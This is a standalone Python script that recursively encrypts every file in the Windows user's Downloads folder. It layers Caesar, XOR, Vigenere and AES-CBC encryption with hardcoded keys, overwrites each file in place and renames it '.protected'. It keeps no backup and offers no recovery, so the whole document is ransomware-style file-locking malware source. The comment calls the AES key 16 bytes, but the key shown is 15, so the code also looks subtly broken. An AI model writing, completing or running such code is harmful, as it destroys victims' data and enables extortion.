import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

# Constants
AES_KEY = b'magicspellmagic'  # 16 bytes for AES-128
AES_IV = b'iv12345678901234'  # 16 bytes IV for AES

# Caesar cipher shift value
CAESAR_SHIFT = 5

# XOR key
XOR_KEY = b'magicspell'

# Vigenere cipher key
VIGENERE_KEY = b'magicspell'

# Directory to encrypt
TARGET_DIR = os.path.join(os.getenv("USERPROFILE"), "Downloads")

# Helper functions
def caesar_cipher_encrypt(data, shift):
    encrypted = []
    for byte in data:
        encrypted.append((byte + shift) % 256)
    return bytes(encrypted)

def xor_encrypt(data, key):
    return bytes(byte ^ key[i % len(key)] for i, byte in enumerate(data))

def vigenere_encrypt(data, key):
    encrypted = []
    key_length = len(key)
    for i, byte in enumerate(data):
        encrypted.append((byte + key[i % key_length]) % 256)
    return bytes(encrypted)

def aes_encrypt(data, key, iv):
    # Pad data to be a multiple of block size
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    # Create AES cipher and encrypt
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(padded_data) + encryptor.finalize()

def encrypt_file(file_path):
    with open(file_path, 'rb') as f:
        data = f.read()

    # Apply encryption algorithms sequentially
    encrypted_data = caesar_cipher_encrypt(data, CAESAR_SHIFT)
    encrypted_data = xor_encrypt(encrypted_data, XOR_KEY)
    encrypted_data = vigenere_encrypt(encrypted_data, VIGENERE_KEY)
    encrypted_data = aes_encrypt(encrypted_data, AES_KEY, AES_IV)

    # Write encrypted data back to the file
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)

    # Rename file to .protected
    os.rename(file_path, file_path + '.protected')

def encrypt_directory(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path)

if __name__ == "__main__":
    encrypt_directory(TARGET_DIR)
